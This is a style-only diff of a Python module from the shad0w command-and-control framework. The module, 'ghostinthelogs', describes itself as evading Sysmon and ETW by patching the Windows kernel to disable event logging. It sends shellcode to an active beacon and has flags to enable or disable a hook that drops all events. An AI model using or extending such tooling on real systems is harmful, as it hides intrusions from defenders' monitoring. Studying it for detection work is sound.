@@ -11,29 +11,31 @@ import argparse
 from lib import auxiliary
 from lib import shellcode
 
-__description__ = "Universally Evade Sysmon and ETW - Patch the kernel to disable windows event logging"
+__description__ = "Universally Evade Sysmon and ETW - patch the kernel to disable Windows event logging"
 __author__ = "@_batsec_"
+__type__ = "module"
 
 # identify the task as shellcode execute
 USERCD_EXEC_ID = 0x3000
 
-# location of rubeus binary
+# location of Rubeus binary
 RUBEUS_BIN = "/root/shad0w/bin/gitl.x64.exe"
 
 # did the command error
 ERROR = False
 error_list = ""
 
-# let argparse error and exit nice
 
 def error(message):
     global ERROR, error_list
     ERROR = True
     error_list += f"\033[0;31m{message}\033[0m\n"
 
+
 def exit(status=0, message=None): 
     if message != None: print(message)
     return
+
 
 def ghostinthelogs_callback(shad0w, data):
     data = data.replace("[+]", "\033[1;32m[+]\033[0m")
@@ -45,6 +47,7 @@ def ghostinthelogs_callback(shad0w, data):
     print('\n'.join(data.splitlines()[3:]))
 
     return ""
+
 
 def set_and_send(shad0w, args):
     args.cls = False
@@ -64,13 +67,14 @@ def set_and_send(shad0w, args):
 
     return
 
+
 def main(shad0w, args):
 
     raw_args = args
 
     # check we actually have a beacon
     if shad0w.current_beacon is None:
-        shad0w.debug.log("ERROR: No active beacon", log=True)
+        shad0w.debug.log("ERROR: No active beacon.", log=True)
         return
 
     # usage examples
@@ -102,7 +106,7 @@ gitl --disable
     parse.add_argument("-e", "--enable", action='store_true', help="Enable the hook (drop all events)")
     parse.add_argument("-d", "--disable", action='store_true', help="Disable the hook (allow all events)")
 
-    # make sure we dont die from weird args
+    # make sure we don't die from weird args
     try:
         args = parse.parse_args(args[1:])
     except:
